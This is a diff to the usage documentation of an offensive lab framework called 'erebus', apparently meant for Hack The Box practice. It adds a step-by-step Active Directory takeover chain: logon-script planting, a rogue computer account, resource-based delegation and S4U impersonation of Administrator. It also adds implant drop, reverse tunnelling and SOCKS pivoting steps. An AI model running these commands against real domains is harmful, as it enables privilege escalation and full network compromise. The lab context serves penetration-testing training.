@@ -8,8 +8,10 @@ Authorized **HTB / owned lab** helpers that run **without** a C2 session or team
 | --- | --- |
 | `erebus inbound …` | tun0 / listeners / SOCKS env / SSH reverse tunnel |
 | `erebus ldap …` | Host-side LDAPS bind / enum / dangling ADCS template names |
-| `erebus smb …` | Host-side SMB shares / ls / get (no implant) |
+| `erebus smb …` | Host-side SMB shares / ls / get (NTLM; `--ticket` is Impacket `smbclient.py -k` until native Kerberos SMB) |
+| `erebus kerberos s4u …` | S4U2Self+S4U2Proxy AES; `--altservice` rewrites ticket sname (getST-style) |
 | `erebus ad password …` | ForceChangePassword via LDAPS `unicodePwd` |
+| `erebus ad add-computer …` | LDAP Add, then Impacket `addcomputer.py -method SAMR` on `WILL_NOT_PERFORM` |
 | `erebus mqtt …` | MQTT subscribe / publish / healthcheck URL hijack |
 | `erebus relay http …` | HTTP NTLM capture → relay to target → held session GET (LFI) |
 
@@ -86,7 +88,17 @@ DanglingTree-class boxes often have creds long before WinRM/RDP. Prefer files fo
 ```bash
 erebus ldap bind --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass
 erebus ldap enum --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass --type interesting
+erebus ldap enum --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass --type acl
 erebus ldap dangling --dc 10.129.x.x --domain danglingtree.htb --user jake.h --pass-file ./jake.pass
+erebus ldap set --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --target bob scriptPath loot.bat --yes
+erebus ad add-computer --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --name ATTACK --out ./mach.pass --yes
+erebus rbcd write --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --to HOST$ --from ATTACK$ --yes
+erebus rbcd show  --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p --to HOST$
+erebus kerberos s4u --dc 10.129.x.x --domain danglingtree.htb --user ATTACK$ --pass-file ./mach.pass \
+  --impersonate Administrator --spn cifs/dc.danglingtree.htb
+erebus kerberos asktgt --dc 10.129.x.x --domain danglingtree.htb --user U --pass-file ./p
+erebus kerberos ticket import ./admin.ccache
+erebus ldap bind --dc 10.129.x.x --domain danglingtree.htb --ticket <id>
 
 erebus smb shares --host 10.129.x.x --anon
 erebus smb get --host 10.129.x.x --share IT --path DanglingTree_RoE_Assessment.pdf --out roe.pdf
@@ -115,7 +127,7 @@ Prefer soft compromise; skip LSASS unless the objective requires it.
 After a Linux foothold (e.g. Gogs RCE / web RCE):
 
 1. **Prefer C Linux implant** (`make implant-c-linux` + CA pin).
-2. If the host cannot reach operator VPN: `erebus inbound tunnel user@TARGET` and `CALLBACK_URL=https://127.0.0.1:8443`.
+2. If the host cannot reach operator VPN: `erebus inbound drop user@TARGET` (tunnel + generate; do not bare-make).
 3. Exercise shell / file / process from the C session (product QA).
 4. **Pivot:** C reverse SOCKS (`socks start`) is implemented — lab-prove on session (M4c live). Fallback: reverse tunnel / Ligolo / Go with justification.
 5. External chisel is fine for speed; document intended path as **C implant** for framework QA.
